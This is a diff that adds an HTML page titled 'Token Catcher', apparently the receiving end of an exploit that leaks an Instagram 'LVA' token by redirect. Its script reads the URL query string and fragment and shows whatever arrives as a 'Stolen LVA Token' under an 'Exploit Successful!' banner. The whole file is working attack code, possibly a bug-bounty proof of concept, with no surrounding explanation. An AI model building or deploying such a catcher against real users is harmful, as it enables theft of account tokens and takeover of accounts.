@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Token Catcher</title>
+</head>
+<body style="font-family: monospace; padding: 20px; background-color: #f0f0f0;">
+    <h2 style="color: red;">Exploit Successful!</h2>
+    <h3>Stolen LVA Token:</h3>
+    <div id="token" style="background: #333; color: #0f0; padding: 15px; word-wrap: break-word;">Waiting...</div>
+
+    <script>
+        // Instagram might send the token in the query parameters (?token=...) 
+        // or the URL fragment (#token=...). This script grabs both.
+        const urlParams = new URLSearchParams(window.location.search);
+        const hashParams = new URLSearchParams(window.location.hash.substring(1));
+        
+        let stolenData = "";
+        
+        if (urlParams.toString()) {
+            stolenData += "Query Params: " + urlParams.toString() + "\n\n";
+        }
+        if (hashParams.toString()) {
+            stolenData += "Hash Params: " + hashParams.toString();
+        }
+
+        if (stolenData) {
+            document.getElementById('token').innerText = stolenData;
+        } else {
+            document.getElementById('token').innerText = "No token received. Check the URL.";
+        }
+    </script>
+</body>
+</html>
